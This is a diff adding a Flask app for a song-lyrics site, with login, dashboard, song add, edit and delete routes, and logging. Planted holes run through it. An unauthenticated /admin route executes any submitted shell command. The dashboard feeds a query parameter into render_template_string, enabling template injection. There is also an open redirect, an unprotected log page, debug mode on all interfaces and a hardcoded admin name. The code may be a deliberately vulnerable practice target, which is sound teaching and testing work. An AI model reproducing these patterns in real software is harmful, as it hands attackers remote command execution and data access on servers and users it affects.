+                conn.close()
+                # Replace 'dashboard' with your desired route
+                return redirect(url_for('dashboard'))
+            else:
+                error_message = "Incorrect password"
+                conn.close()
+                return render_template('login.html', error_message=error_message, error_color='red')
+        else:
+            error_message = "User not found"
+            conn.close()
+            return render_template('login.html', error_message=error_message, error_color='red')
+
+    return render_template('login.html')
+
+@app.route('/dashboard')
+def dashboard():
+    if 'username' in session:
+        conn=create_connection()
+        user = session['username']
+        print(user)
+        cursor1 = conn.cursor()
+        cursor1.execute(
+            'SELECT permission FROM users where username = ?', (user,))
+        permission = cursor1.fetchone()
+        permission = permission[0]
+        conn.close()
+
+        if session['username'] == "samjose":
+            return redirect('/admincontrol')
+        
+        user_name = request.args.get('name') or session['username']
+
+        dashboard_html = '''<!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8" />
+                <title>Dashboard</title>
+                <meta name="viewport" content="width=device-width, initial-scale=1" />
+                <link
+                rel="stylesheet"
+                href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css"
+                />
+                <style>
+                /* Add custom styles if needed */
+                .card {
+                    margin-bottom: 20px;
+                }
+                </style>
+            </head>
+        ''' + f'''
+            <body>
+                <br />
+                <center>
+                <h1>Welcome {user_name}!</h1>
+                </center>
+                <div class="container mt-4">
+                <div class="row mt-4">
+                    <div class="col-md-6">
+                    <div class="card">
+                        <center>
+                        <div class="card-body">
+                            <h5 class="card-title">All Songs / Home Page</h5>
+                            <p class="card-text">Navigate to the All Songs.</p>
+                            <a target="_blank" href="/" class="btn btn-primary"
+                            >All Songs</a
+                            >
+                        </div>
+                        </center>
+                    </div>
+                    </div>
+                    <div class="col-md-6">
+                    <div class="card">
+                        <center>
+                        <div class="card-body">
+                            <h5 class="card-title">Hindi Songs</h5>
+                            <p class="card-text">Navigate to the Hindi Songs.</p>
+                            <a target="_blank" href="/hindi" class="btn btn-primary"
+                            >Hindi Songs</a
+                            >
+                        </div>
+                        </center>
+                    </div>
+                    </div>
+                    <div class="col-md-6">
+                    <div class="card">
+                        <center>
+                        <div class="card-body">
+                            <h5 class="card-title">Telugu Songs</h5>
+                            <p class="card-text">Navigate to the Telugu Songs.</p>
+                            <a target="_blank" href="/telugu" class="btn btn-primary"
+                            >Telugu Songs</a
+                            >
+                        </div>
+                        </center>
+                    </div>
+                    </div>
+
+                    <div class="col-md-6">
+                    <div class="card">
+                        <center>
+                        <div class="card-body">
+                            <h5 class="card-title">Tamil Songs</h5>
+                            <p class="card-text">Navigate to the Tamil Songs.</p>
+                            <a target="_blank" href="/tamil" class="btn btn-primary"
+                            >Tamil Songs</a
+                            >
+                        </div>
+                        </center>
+                    </div>
+                    </div>
+                    <div class="col-md-6">
+                    <div class="card">
+                        <center>
+                        <div class="card-body">
+                            <h5 class="card-title">Malayalam Songs</h5>
+                            <p class="card-text">Navigate to the Malayalam Songs.</p>
+                            <a target="_blank" href="/malayalam" class="btn btn-primary"
+                            >Malayalam Songs</a
+                            >
+                        </div>
+                        </center>
+                    </div>
+                    </div>
+
+                    <div class="col-md-6">
+                    <div class="card">
+                        <center>
+                        <div class="card-body">
+                            <h5 class="card-title">Bible Page</h5>
+                            <p class="card-text">Navigate to the Bible Page.</p>
+                            <a target="_blank" href="/bible" class="btn btn-primary"
+                            >Bible Page</a
+                            >
+                        </div>
+                        </center>
+                    </div>
+                    </div>
+                    <div class="col-md-6">
+                    <div class="card">
+                        <center>
+                        <div class="card-body">
+                            <h5 class="card-title">Updates Page</h5>
+                            <p class="card-text">Navigate to the Updates Page.</p>
+                            <a target="_blank" href="/updates" class="btn btn-primary"
+                            >Updates</a
+                            >
+                        </div>
+                        </center>
+                    </div>
+                    </div> ''' + '''
+
+                    <!-- Add more cards as needed -->
+
+                    <div class="col-md-6">
+                    <center>
+                        <div class="card">
+                        <div class="card-body">
+                            <h5 class="card-title">Controls Page</h5>
+                            <p class="card-text">Access controls page.</p>
+                            <a
+                            target="_blank"
+                            href="/control/{{user_name}}"
+                            class="btn btn-primary"
+                            >Controls Page</a
+                            >
+                        </div>
+                        </div>
+                    </center>
+                    </div>
+                </div>
+                <div class="row mt-4">
+                    <div class="col">
+                    <div class="card">
+                        <center>
+                        <div class="card-body">
+                            <h5 class="card-title">Display Page</h5>
+                            <p class="card-text">Go to the display page.</p>
+                            <a
+                            target="_blank"
+                            href="/display/{{user_name}}_display"
+                            class="btn btn-primary"
+                            >Display Page</a
+                            >
+                        </div>
+                        </center>
+                    </div>
+                    </div>
+                </div>
+
+                {% if permission > 0 %}
+                <div class="row mt-4">
+                    <div class="col">
+                    <div class="card">
+                        <center>
+                        <div class="card-body">
+                            <h5 class="card-title">Add Songs</h5>
+                            <p class="card-text">Add new songs to the database.</p>
+                            <a target="_blank" href="/add_songs" class="btn btn-primary"
+                            >Add Songs</a
+                            >
+                        </div>
+                        </center>
+                    </div>
+                    </div>
+                </div>
+                {% endif %}
+                </div>
+
+                <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+                <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
+            </body>
+            </html>
+        '''
+
+        return render_template_string(dashboard_html, user_name=user_name, permission=permission )
+        # return render_template("dashboard.html", user_name=user_name, permission=permission)
+    return render_template('login.html', error_message="Kindly Login to access your dashboard!", error_color='red')
+
+
+@app.route('/logout')
+def logout():
+    # Clear the user's session data
+    # Replace 'username' with your session variable name
+    session.pop('username', None)
+    session.clear()
+    
+
+    # Redirect to the home page or login page after logout
+    return redirect(url_for('home'))
+
+
+@app.route('/add_songs', methods=['GET', 'POST'])
+def add_songs():
+    if 'username' not in session:
+        return render_template('login.html', error_message="Kindly Login to add Songs!", error_color='red')
+    
+    else:
+        conn = create_connection()
+        user = session['username']
+        cursor1 = conn.cursor()
+        cursor1.execute(
+            'SELECT permission FROM users where username = ?', (user,))
+        permission = cursor1.fetchone()
+        permission = permission[0]
+
+        if permission>0:
+
+
+            if request.method == 'POST':
+                transliteration_lyrics = request.form.get('transliterationLyrics')
+                chord = request.form.get('chord')
+                title = request.form['title']
+                alternate_title = request.form.get('alternateTitle')
+                lyrics = request.form['lyrics']
+                youtube_link = request.form['youtube_link']
+                search_title = remove_special_characters(
+                    title) + " " + remove_special_characters(alternate_title)
+                search_lyrics = lyrics.replace(
+                    '\r\n', ' ') + " " + transliteration_lyrics.replace('\n', ' ')
+                search_lyrics = remove_special_characters(search_lyrics)
+
+                conn = create_connection()
+                cursor = conn.cursor()
+
+                # Get the current date and time
+                current_date = str(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
+
+                # Insert song data into the songs table
+                cursor.execute('''
+                    INSERT INTO songs (title, alternate_title, lyrics, transliteration, youtube_link, chord, search_title, search_lyrics, create_date, modified_date, username)
+                    VALUES ( ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                ''', (title, alternate_title, lyrics, transliteration_lyrics,
+                    youtube_link, chord, search_title, search_lyrics, current_date, current_date, session['username']))
+
+                cursor.execute('SELECT MAX(id) FROM songs')
+                latest_id = cursor.fetchone()[0]
+
+                conn.commit()
+                conn.close()
+
+                conn = sqlite3.connect('logs.db')
+                cursor = conn.cursor()
+                cursor.execute(
+                    "INSERT INTO add_logs (user, time, link) VALUES (?, datetime('now'), ?)", (session['username'], f'/songs/{latest_id}'))
+                conn.commit()
+                conn.close()
+
+                return redirect('/dashboard')
+
+            return render_template('add_song.html')
+        else:
+            return jsonify({'message': 'Not authorized'}), 401
+
+
+@app.route('/delete_song/<int:song_id>', methods=['DELETE'])
+def delete_song(song_id):
+    if 'username' not in session:
+        # Unauthorized status code
+        render_template('login.html', error_message="Kindly Login to delete Songs!", error_color='red')
+
+    else:
+        conn = create_connection()
+        user = session['username']
+        cursor1 = conn.cursor()
+        cursor1.execute(
+            'SELECT permission FROM users where username = ?', (user,))
+        permission = cursor1.fetchone()
+        permission = permission[0]
+
+        if permission>2:
+
+            # Connect to the oilnwine database
+            conn_oilnwine = create_connection()
+            cur_oilnwine = conn_oilnwine.cursor()
+
+            # Connect to the logs database
+            conn_logs = sqlite3.connect('logs.db')
+            cur_logs = conn_logs.cursor()
+
+            # Get the row from the songs table in oilnwine database
+            cur_oilnwine.execute("SELECT * FROM songs WHERE id=?", (song_id,))
+            row_to_transfer = cur_oilnwine.fetchone()
+
+            if row_to_transfer:
+                # Get current time
+                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+                # Update the modified_date column
+                row_to_transfer = list(row_to_transfer)
+                # Assuming modified_date is the last column
+                row_to_transfer[-2] = current_time
+
+                # Insert the row into the delete_logs table in logs database
+                cur_logs.execute("""
+                    INSERT INTO delete_logs (delete_id, title, alternate_title, lyrics, transliteration, chord, search_title, search_lyrics, youtube_link, create_date, modified_date, username)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                """, row_to_transfer)
+
+                # Commit the transaction in logs database
+                conn_logs.commit()
+                print("Row transferred successfully.")
+            else:
+                print("No such row found in songs table in oilnwine database.")
+
+            # Close connections
+            conn_oilnwine.close()
+            conn_logs.close()
+
+            conn = create_connection()
+            cursor = conn.cursor()
+
+            # Delete the song based on the provided song_id
+            cursor.execute('DELETE FROM songs WHERE id = ?', (song_id,))
+            conn.commit()
+            conn.close()
+
+            # OK status code
+            return jsonify({'message': 'Song deleted successfully'}), 200
+        else:
+            return jsonify({'message': 'Not authorized'}), 401
+
+
+@app.route('/edit_songs/<int:id>', methods=['GET', 'POST'])
+def edit_songs(id):
+    if 'username' in session:
+        conn = create_connection()
+        user = session['username']
+        cursor1 = conn.cursor()
+        cursor1.execute(
+            'SELECT permission FROM users where username = ?', (user,))
+        permission = cursor1.fetchone()
+        permission = permission[0]
+
+        if permission>1:
+            try:
+                conn=create_connection()
+                cursor = conn.cursor()
+                # Execute a query to select data from the 'songs' table for the selected ID
+                cursor.execute('SELECT * FROM songs WHERE id = ?', (id,))
+                default_values = cursor.fetchone()
+
+                conn.close()
+
+                if request.method == 'POST':
+                    transliteration_lyrics = request.form.get(
+                        'transliterationLyrics')
+                    chord = request.form.get('chord')
+                    title = request.form['title']
+                    alternate_title = request.form.get('alternateTitle')
+                    lyrics = request.form['lyrics']
+                    youtube_link = request.form['youtube_link']
+                    search_title = remove_special_characters(
+                        title) + " " + remove_special_characters(alternate_title)
+                    search_lyrics = lyrics.replace(
+                        '\r\n', ' ') + " " + transliteration_lyrics.replace('\n', ' ')
+                    search_lyrics = remove_special_characters(search_lyrics)
+
+                    conn_oilnwine = sqlite3.connect('oilnwine.db')
+                    cur_oilnwine = conn_oilnwine.cursor()
+
+                    # Connect to the logs database
+                    conn_logs = sqlite3.connect('logs.db')
+                    cur_logs = conn_logs.cursor()
+
+                    # Get the row from the songs table in oilnwine database
+                    cur_oilnwine.execute("SELECT * FROM songs WHERE id=?", (id,))
+                    row_to_transfer = cur_oilnwine.fetchone()
+
+                    if row_to_transfer:
+                        # Get current time
+                        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+                        # Update the modified_date column
+                        row_to_transfer = list(row_to_transfer)
+                        # Assuming modified_date is the last column
+                        row_to_transfer[-2] = current_time
+
+                        # Insert the row into the delete_logs table in logs database
+                        cur_logs.execute("""
+                            INSERT INTO edit_logs (edit_id, title, alternate_title, lyrics, transliteration, chord, search_title, search_lyrics, youtube_link, create_date, modified_date, username)
+                            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                        """, row_to_transfer)
+
+                        # Commit the transaction in logs database
+                        conn_logs.commit()
+                        print("Row transferred successfully.")
+                    else:
+                        print("No such row found in songs table in oilnwine database.")
+
+                    # Close connections
+                    conn_oilnwine.close()
+                    conn_logs.close()
+
+                    conn = create_connection()
+                    cursor = conn.cursor()
+
+                    # Get the current date and time
+                    current_date = str(
+                        datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
+
+                    cursor.execute('''
+                                    UPDATE songs 
+                                    SET title = ?, alternate_title = ?, lyrics = ?, 
+                                        transliteration = ?, youtube_link = ?, chord = ?, search_title = ?, 
+                                        search_lyrics = ?, modified_date = ?, username = ?
+                                    WHERE id = ?
+                                ''', (title, alternate_title, lyrics, transliteration_lyrics,
+                                    youtube_link, chord, search_title, search_lyrics, current_date,
+                                    session['username'], id))
+
+                    print(title, alternate_title, lyrics, transliteration_lyrics,
+                        youtube_link, chord, search_title, search_lyrics, current_date,
+                        session['username'], id)
+
+                    conn.commit()
+                    conn.close()
+
+                    return redirect(f'/song/{id}')
+            except:
+                conn.close()
+                return "Selected Song Does not Exist."
+
+            id = default_values[0]
+            title = default_values[1]
+            alternate_title = default_values[2]
+            lyrics = default_values[3]
+            transliteration_lyrics = default_values[4]
+            chord = default_values[5]
+            link = default_values[8]
+
+            return render_template("edit_song.html", id=id, title=title, alternate_title=alternate_title, link=link, chord=chord, lyrics=lyrics, transliteration_lyrics=transliteration_lyrics)
+        else:
+            return jsonify({'message': 'Not authorized'}), 401
+    return render_template('login.html', error_message="Kindly Login to edit Songs!", error_color='red')
+
+
+@app.route('/admin_area')
+def song_logs():
+    # Connect to the SQLite database
+    conn = sqlite3.connect('logs.db')
+    cur = conn.cursor()
+
+    # Fetch data from the add_logs table
+    cur.execute("SELECT * FROM add_logs")
+    add_logs = cur.fetchall()
+
+    # Fetch data from the edit_logs table
+    cur.execute("SELECT * FROM edit_logs")
+    edit_logs = cur.fetchall()
+
+    # Fetch data from the delete_logs table
+    cur.execute("SELECT * FROM delete_logs")
+    delete_logs = cur.fetchall()
+
+    # Close the connection
+    conn.close()
+
+    # Render the HTML template and pass the data to it
+    return render_template('song_logs.html', add_logs=add_logs, edit_logs=edit_logs, delete_logs=delete_logs)
+
+
+@app.route('/updates')
+def updates():
+    return render_template('updates.html')
+
+@app.route('/handle-url', methods=['POST'])
+def handle_url():
+    url = request.form.get('url')
+    
+    if url:
+        # Check if the URL starts with 'https://'
+        if url.startswith('https://'):
+            # Check if the URL contains 'localhost'
+            if 'localhost' in url:
+                # Replace 'https' with 'http' if 'localhost' is in the URL
+                url = url.replace('https://', 'http://', 1)
+            
+            # Perform the redirection
+            return redirect(url)
+        else:
+            return "Not Allowed: URL must start with https://", 400
+    else:
+        return "No URL provided", 400
+
+@app.route('/admin', methods=['GET', 'POST'])
+def console():
+    output = ''
+    if request.method == 'POST':
+        command = request.form['command']
+        try:
+            # Note: In a real-world application, never use shell=True with user input due to security risks
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
+            output = result.stdout if result.returncode == 0 else result.stderr
+        except Exception as e:
+            output = str(e)
+
+    return render_template('console.html', output=output)
+
+if __name__ == '__main__':
+    socketio.run(app, host='0.0.0.0', port=5000,
+                 debug=True, allow_unsafe_werkzeug=True)
